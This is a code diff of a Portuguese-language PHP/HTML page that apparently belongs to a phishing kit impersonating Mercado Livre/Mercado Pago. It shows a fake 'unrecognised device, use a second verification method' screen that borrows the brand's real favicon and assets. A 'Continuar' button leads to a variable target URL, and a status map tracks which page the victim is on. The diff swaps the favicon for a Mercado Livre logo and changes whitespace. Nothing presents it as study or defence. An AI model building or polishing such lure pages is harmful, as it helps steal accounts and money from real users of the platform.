@@ -41,7 +41,7 @@ if (isMobileDevice()) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Use um segundo método de verificação para confirmar que a conta pertence a você</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     <style>
         :root {
             --cor-amarela: #ffe600;
@@ -163,7 +163,7 @@ if (isMobileDevice()) {
             </div>
             <h1 class="card-title">Use um segundo método de verificação para confirmar que a conta pertence a você</h1>
             <p class="card-description">Não reconhecemos o dispositivo pelo qual você está acessando. Por segurança, vamos te pedir um segundo método de verificação.</p>
-            
+
             <a href="<?php echo htmlspecialchars($target_url); ?>" class="btn btn-primary">Continuar</a>
         </div>
     </main>
@@ -196,7 +196,7 @@ if (isMobileDevice()) {
 
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
+
             // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
